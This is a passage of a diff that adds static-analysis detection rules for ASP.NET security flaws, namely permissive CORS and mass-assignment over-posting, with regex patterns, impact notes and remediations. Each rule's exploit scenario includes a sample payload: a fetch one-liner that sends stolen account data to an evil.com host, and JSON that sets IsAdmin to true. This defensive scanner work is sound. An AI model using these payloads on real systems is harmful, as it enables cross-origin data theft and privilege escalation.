+        description: "SetIsOriginAllowed returning true for all origins"
+      - type: regex
+        pattern: '\.SetIsOriginAllowed\s*\(\s*origin\s*=>\s*true\s*\)'
+        description: "Lambda always allowing origin"
+      - type: regex
+        pattern: 'policy\.AllowAnyOrigin\s*\(\s*\)'
+        description: "CORS policy builder with any origin"
+      - type: regex
+        pattern: 'EnableCors\s*\(\s*\)(?![\s\S]*?WithOrigins)'
+        description: "EnableCors without specifying origins"
+    anti_patterns:
+      - '\.WithOrigins\s*\(\s*"https?://[\w.-]+'
+      - '\.WithOrigins\s*\(\s*Configuration'
+      - '\.WithOrigins\s*\(\s*allowedOrigins'
+      - 'SetIsOriginAllowed\s*\(\s*origin\s*=>\s*allowedOrigins\.Contains'
+      - 'SetIsOriginAllowedToAllowWildcardSubdomains'
+      - 'options\.AddPolicy\s*\(\s*"[^"]+"\s*,\s*policy\s*=>\s*\{[\s\S]*?WithOrigins'
+      - 'CorsOptions'
+      - 'WithOrigins\s*\(\s*builder\.Configuration'
+      - '\.AllowCredentials\s*\(\s*\)[\s\S]*?\.WithOrigins\s*\(\s*"https://'
+      - 'CorsPolicy\s*\{[\s\S]*?Origins\s*=\s*\{[\s\S]*?"https://'
+      - 'ICorsPolicyProvider'
+      - 'corsSettings'
+      - 'DisallowCredentials\s*\(\s*\)'
+      - 'GetSection\s*\(\s*"Cors"'
+      - 'corsPolicyOptions'
+    bypass_variants:
+      - description: "Named CORS policy restrictive but default policy permissive"
+        pattern: 'AddDefaultPolicy\s*\(\s*policy\s*=>[\s\S]*?AllowAnyOrigin'
+      - description: "CORS policy restricted but custom middleware overrides headers"
+        pattern: 'context\.Response\.Headers\.Add\s*\(\s*"Access-Control-Allow-Origin"\s*,\s*"\*"'
+      - description: "Origin validation using Contains instead of exact match"
+        pattern: 'SetIsOriginAllowed\s*\(\s*origin\s*=>\s*origin\.Contains\s*\('
+    evasion_indicators:
+      - "CORS policy configured in middleware but overridden by response headers"
+      - "Multiple CORS policies with different permissions"
+      - "CORS configuration in appsettings.json with permissive defaults"
+    encoding_variants:
+      - type: "config_based"
+        pattern: 'Cors:AllowedOrigins.*\*'
+      - type: "env_override"
+        pattern: 'Environment\.GetEnvironmentVariable\s*\(\s*"CORS_ORIGINS"\s*\)\s*\?\?\s*"\*"'
+    multi_function_chain_patterns:
+      - "AddCors -> AllowAnyOrigin() -> UseCors -> authenticated API exposed cross-origin"
+      - "AllowAnyOrigin() -> AllowCredentials() -> cookie-based auth -> session theft"
+      - "SetIsOriginAllowed(_ => true) -> WithHeaders('Authorization') -> token theft"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Permissive CORS enables cross-origin data theft from any authenticated session"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Cross-origin request from attacker's domain"
+        sink: "Authenticated API response with sensitive data"
+        through: "Permissive CORS policy"
+    impact: |
+      An insecure CORS policy allows any website to make cross-origin
+      requests and read responses from the ASP.NET API. When combined
+      with AllowCredentials(), the attacker's page can make authenticated
+      requests using the victim's session cookies. This enables complete
+      data theft, account manipulation, and unauthorized API access from
+      any domain the attacker controls.
+    remediation: |
+      Configure CORS with specific allowed origins:
+
+      ```csharp
+      builder.Services.AddCors(options =>
+      {
+          options.AddPolicy("ProductionPolicy", policy =>
+          {
+              policy.WithOrigins(
+                      "https://app.example.com",
+                      "https://admin.example.com"
+                  )
+                  .WithMethods("GET", "POST", "PUT", "DELETE")
+                  .WithHeaders("Content-Type", "Authorization")
+                  .AllowCredentials();
+          });
+      });
+
+      app.UseCors("ProductionPolicy");
+      ```
+    references:
+      - "https://learn.microsoft.com/en-us/aspnet/core/security/cors"
+      - "https://cwe.mitre.org/data/definitions/942.html"
+      - "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
+      - "https://portswigger.net/web-security/cors"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'AddCors'
+        - 'UseCors'
+        - '\[EnableCors\]'
+        - 'CorsPolicyBuilder'
+      taint_source_indicators:
+        - 'Origin\s*header'
+        - 'Request\.Headers\["Origin"\]'
+      taint_sink_indicators:
+        - 'AllowAnyOrigin'
+        - 'SetIsOriginAllowed'
+        - 'Access-Control-Allow-Origin'
+      sanitization_patterns:
+        - 'WithOrigins\s*\(\s*"https://'
+        - 'allowedOrigins\.Contains'
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (allow_credentials ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An ASP.NET Core API uses AllowAnyOrigin() with AllowCredentials()
+        (via SetIsOriginAllowed(_ => true)). An attacker hosts a malicious
+        page that makes fetch requests to the API with credentials: 'include'.
+        The victim's authentication cookie is sent automatically, and the
+        permissive CORS allows the attacker to read the response containing
+        user data, API keys, and account balances.
+      example_payload: "fetch('https://api.target.com/account/balance',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com/steal',{method:'POST',body:JSON.stringify(d)}))"
+      attacker_objective: "Exploit permissive CORS to steal authenticated user data cross-origin"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "medium"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: false
+      high_impact_flag: true
+      related_rules:
+        - "FW-ASPNET-001"
+        - "FW-ASPNET-004"
+        - "FW-EXPRESS-002"
+        - "FW-SPRING-003"
+
+  - rule_id: "FW-ASPNET-006"
+    title: "Over-Posting via Model Binding Without Bind Attribute in ASP.NET"
+    description: >
+      Detects ASP.NET MVC and Web API controllers that bind request data
+      directly to domain models without using [Bind], view models (DTOs),
+      or explicit property whitelisting. This enables mass assignment
+      (over-posting) attacks where attackers add extra fields to requests
+      that modify properties the developer did not intend to be user-settable,
+      such as IsAdmin, Price, or AccountBalance.
+    language: csharp
+    category: framework_misuse
+    severity: High
+    confidence: 0.86
+    cwe: CWE-915
+    owasp: "A04:2021-Insecure Design"
+    tags:
+      - aspnet
+      - mass-assignment
+      - over-posting
+      - model-binding
+      - authorization
+      - csharp
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'public\s+(?:async\s+)?(?:Task<)?IActionResult\s+\w+\s*\(\s*(?!\[Bind)[A-Z]\w+\s+\w+\s*\)'
+        description: "Action accepting domain model without [Bind] attribute"
+      - type: regex
+        pattern: '\[HttpPost\][\s\S]*?public\s+(?:async\s+)?(?:Task<)?IActionResult\s+Create\s*\(\s*(?!\[Bind)\w+\s+\w+'
+        description: "Create action binding entire model"
+      - type: regex
+        pattern: 'TryUpdateModelAsync\s*<\s*\w+\s*>\s*\(\s*\w+\s*\)(?![\s\S]*?new\s*\[\s*\])'
+        description: "TryUpdateModelAsync without property whitelist"
+      - type: regex
+        pattern: '\[HttpPut\][\s\S]*?public\s+(?:async\s+)?(?:Task<)?IActionResult\s+\w+\s*\(\s*(?!\[Bind)\w+\s+\w+'
+        description: "PUT action binding full domain model"
+      - type: regex
+        pattern: '\[FromBody\]\s*(?!.*DTO|.*Dto|.*ViewModel|.*Request|.*Command)\w+Model\s+\w+'
+        description: "FromBody binding to Model class instead of DTO"
+      - type: regex
+        pattern: 'UpdateModel\s*\(\s*\w+\s*\)(?![\s\S]*?\[\s*")'
+        description: "UpdateModel without property include list"
+    anti_patterns:
+      - '\[Bind\s*\(\s*"'
+      - '\[Bind\s*\(\s*Include\s*='
+      - '\[BindNever\]'
+      - '\[FromBody\]\s*\w+(Dto|DTO|ViewModel|Request|Command)'
+      - 'TryUpdateModelAsync<\w+>\s*\(\s*\w+\s*,\s*""\s*,\s*\w+\s*=>\s*\w+\.\w+'
+      - 'AutoMapper'
+      - 'Mapper\.Map\s*<'
+      - 'new\s+\w+\s*\{[\s\S]*?=\s*\w+\.\w+'
+      - '\[JsonIgnore\]'
+      - 'BindProperty.*SupportsGet'
+      - 'ModelMetadataTypeAttribute'
+      - 'DataTransferObject'
+      - 'IPropertyValidator'
+      - 'FluentValidation'
+      - '\[Editable\s*\(\s*false\s*\)\]'
+    bypass_variants:
+      - description: "Bind attribute used but includes sensitive properties"
+        pattern: '\[Bind\s*\(\s*"[^"]*(?:IsAdmin|Role|Price|Balance)'
+      - description: "AutoMapper configured to map all properties including sensitive ones"
+        pattern: 'CreateMap\s*<\s*\w+\s*,\s*\w+\s*>\s*\(\s*\)(?![\s\S]*?ForMember)'
+      - description: "DTO used but mapped back to entity without filtering"
+        pattern: 'Mapper\.Map\s*<\s*\w+\s*>\s*\(\s*dto\s*\)[\s\S]*?SaveChanges'
+    evasion_indicators:
+      - "Extra JSON properties in request body not visible in API documentation"
+      - "Domain model has computed properties that can be overwritten via binding"
+      - "Entity framework tracking mode auto-saves bound changes"
+    encoding_variants:
+      - type: "json_extra_fields"
+        pattern: '\{\s*"[^"]+"\s*:\s*"[^"]*"\s*,\s*"isAdmin"\s*:\s*true'
+      - type: "form_hidden_fields"
+        pattern: '<input\s+type\s*=\s*"hidden"\s+name\s*=\s*"IsAdmin"\s+value'
+    multi_function_chain_patterns:
+      - "[HttpPost] -> Create(User user) -> db.Users.Add(user) -> SaveChanges [user.IsAdmin set by attacker]"
+      - "[HttpPut] -> Update(Product product) -> db.Entry(product).State = Modified -> price manipulation"
+      - "TryUpdateModelAsync<User>(user) -> user.Role = attacker_value -> privilege escalation"
+    privilege_context_flags:
+      requires_auth_context: true
+      admin_only_risk: true
+      escalation_vector: "Mass assignment enables privilege escalation by setting admin/role properties"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: false
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "HTTP request body with extra properties"
+        sink: "Entity Framework model saved to database"
+        through: "ASP.NET model binding without property filtering"
+    impact: |
+      Mass assignment (over-posting) allows attackers to modify model
+      properties that should not be user-settable. Attackers can set
+      IsAdmin=true to gain admin access, modify Price or Balance fields
+      for financial fraud, change ownership fields to take over resources,
+      or modify internal state fields to bypass business logic. Entity
+      Framework auto-saves these changes to the database.
+    remediation: |
+      Use DTOs/ViewModels or [Bind] attribute to restrict bindable properties:
+
+      ```csharp
+      // Option 1: Use a DTO/ViewModel (preferred)
+      public class CreateUserDto
+      {
+          [Required]
+          public string Name { get; set; }
+          [Required, EmailAddress]
+          public string Email { get; set; }
+          // No IsAdmin, Role, or Balance properties
+      }
+
+      [HttpPost]
+      public async Task<IActionResult> Create([FromBody] CreateUserDto dto)
+      {
+          var user = new User
+          {
+              Name = dto.Name,
+              Email = dto.Email,
+              IsAdmin = false,  // Explicitly set
+              Role = "User",    // Explicitly set
+          };
+          _context.Users.Add(user);
+          await _context.SaveChangesAsync();
+          return Ok();
+      }
+
+      // Option 2: Use [Bind] attribute
+      [HttpPost]
+      public IActionResult Create(
+          [Bind("Name,Email")] User user)
+      {
+          // Only Name and Email are bound from request
+      }
+      ```
+    references:
+      - "https://learn.microsoft.com/en-us/aspnet/core/mvc/models/model-binding"
+      - "https://cwe.mitre.org/data/definitions/915.html"
+      - "https://owasp.org/Top10/A04_2021-Insecure_Design/"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
+    context_awareness:
+      surrounding_context_patterns:
+        - '\[HttpPost\]'
+        - '\[HttpPut\]'
+        - ':\s*Controller'
+        - 'DbContext'
+      taint_source_indicators:
+        - '\[FromBody\]'
+        - '\[FromForm\]'
+        - 'Request\.Form'
+      taint_sink_indicators:
+        - '\.Add\s*\('
+        - '\.Update\s*\('
+        - 'SaveChanges'
+        - 'SaveChangesAsync'
+      sanitization_patterns:
+        - '\[Bind\s*\('
+        - '\[BindNever\]'
+        - 'Mapper\.Map'
+        - 'Dto\s+\w+'
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (admin_property_present ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        An ASP.NET Core API has a user registration endpoint that accepts
+        a User model directly: Create([FromBody] User user). The User model
+        has an IsAdmin property defaulting to false. An attacker sends:
+        {"Name":"Evil","Email":"evil@test.com","IsAdmin":true}
+        ASP.NET model binding sets IsAdmin=true, the entity is saved to
+        the database, and the attacker gains administrator privileges.
+      example_payload: '{"Name":"attacker","Email":"attacker@evil.com","Password":"pass123","IsAdmin":true,"Role":"Administrator"}'
+      attacker_objective: "Escalate privileges by setting admin or role properties through mass assignment"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-ASPNET-001"
+        - "FW-LARAVEL-002"
